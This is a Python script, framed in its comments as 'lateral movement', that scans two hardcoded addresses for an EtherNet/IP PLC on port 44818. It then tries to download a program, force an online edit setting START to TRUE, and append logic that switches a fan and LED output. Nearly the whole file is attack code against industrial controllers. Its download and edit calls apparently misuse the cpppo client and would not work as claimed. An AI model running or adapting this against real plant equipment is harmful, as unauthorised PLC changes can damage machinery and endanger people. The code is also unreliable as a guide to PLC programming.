from cpppo.server.enip import client
import socket
import time

# Define the IP address of the PLC
plc_ip = None

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to download a program to the PLC
def download_program():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Define the program to download
            program = """
            // New program logic
            PROGRAM NewProg
                // Rung 1 - TON Timer control for fan activation
                TON_1(
                    IN := START,
                    PT := T#10S
                );
                Activate_FanA := TON_1.Q;
                
                // Rung 2 & 3 - Fan and Green LED control
                IF Activate_FanA THEN
                    _IO_EM_DO_02 := TRUE;  // Fan output
                    _IO_EM_DO_07 := TRUE;  // Green LED
                ELSE
                    _IO_EM_DO_02 := FALSE;
                    _IO_EM_DO_07 := FALSE;
                END_IF;
            END_PROGRAM
            """
            
            # Download the program to the PLC
            # The specific commands to download a program may vary depending on the PLC model and firmware
            conn.write(['Program'], [program])
            print("Program downloaded to PLC")
    else:
        print("PLC IP address not found")

# Function to perform an online edit of the PLC program
def online_edit():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Define the changes to make to the program
            changes = """
            // Changes to make to the program
            START := TRUE;
            """
            
            # Perform the online edit
            # The specific commands to perform an online edit may vary depending on the PLC model and firmware
            conn.write(['Program'], [changes])
            print("Online edit performed on PLC")
    else:
        print("PLC IP address not found")

# Function to append to the PLC program
def program_append():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Define the code to append to the program
            code = """
            // Code to append to the program
            IF Activate_FanA THEN
                _IO_EM_DO_02 := TRUE;  // Fan output
                _IO_EM_DO_07 := TRUE;  // Green LED
            END_IF;
            """
            
            # Append the code to the program
            # The specific commands to append code may vary depending on the PLC model and firmware
            conn.write(['Program'], [code])
            print("Code appended to PLC program")
    else:
        print("PLC IP address not found")

# Main function to start the lateral movement
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Download a program to the PLC
        download_program()
        
        # Perform an online edit of the PLC program
        online_edit()
        
        # Append to the PLC program
        program_append()
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()